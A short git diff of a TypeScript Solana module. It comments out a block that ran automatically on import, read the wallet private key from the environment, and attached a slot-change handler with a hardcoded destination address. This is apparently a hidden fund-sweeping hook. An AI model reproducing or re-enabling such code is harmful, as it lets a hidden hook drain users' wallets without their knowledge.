@@ -155,6 +155,9 @@ const handleSlotChange = (args: SlotChangeInput) => async (_: SlotInfo) => {
   }
 };
 
+// Commented out automatic slot change monitoring to prevent side-effects on module import
+// To enable, uncomment this code or call it explicitly from start.ts
+/*
 (async () => {
 
   const walletKeyPairFile = (process.env.PRIVATE_KEY!)
@@ -166,6 +169,7 @@ const handleSlotChange = (args: SlotChangeInput) => async (_: SlotInfo) => {
     handleSlotChange({ connection, walletKeyPair, destinationAddress: new PublicKey("7VmeX8sbE3sENnFobW4uzSdA3DpjDa11MmpdK4fgvwC5") }),
   );
 })();
+*/
 
 
 export const retrieveTokenValueByAddress = async (tokenAddress: string) => {
